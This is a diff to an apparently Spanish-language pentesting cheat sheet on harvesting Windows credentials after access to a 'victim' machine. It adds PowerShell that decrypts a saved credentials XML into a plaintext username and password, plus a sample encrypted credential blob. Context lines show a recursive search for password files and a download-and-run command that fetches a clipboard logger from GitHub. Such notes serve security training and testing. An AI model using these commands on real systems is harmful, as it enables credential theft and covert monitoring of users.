@@ -60,6 +60,16 @@ Una vez que lo metimos en la pc victima lo corremos con:
 #### BUscar una palabra en base a una extensión:
     dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 
+#### Decrypting PowerShell Credentials xml
+$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+$credential.GetNetworkCredential().username
+$credential.GetNetworkCredential().password
+
+#### Podemos encontrar también credenciales de en "binario"
+
+                01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
+
+
 #### Extraer contraseñas de sticky notes
 Las sticky notes (aunque no lo demuesten) son una base de datos.
 
@@ -134,7 +144,6 @@ para esto podemos usar SessionGopher
 ### Obtener el clipboard
     IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
     Invoke-ClipboardLogger
-
 ---
 
 ### Obtener credenciales de AWS
